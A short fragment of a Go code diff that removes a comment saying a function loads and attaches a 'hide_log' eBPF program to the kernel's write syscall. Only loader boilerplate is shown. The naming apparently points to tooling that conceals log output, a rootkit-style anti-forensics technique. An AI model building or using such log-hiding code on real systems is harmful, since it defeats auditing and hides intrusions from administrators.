@@ -12,7 +12,6 @@ import (
 //go:embed obj/hide_log.o
 var hideLogObj []byte
 
-// Load and attach the hide_log eBPF program to kprobe __x64_sys_write
 func LoadAndAttachHideLog() (link.Link, error) {
 	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(hideLogObj))
 	if err != nil {
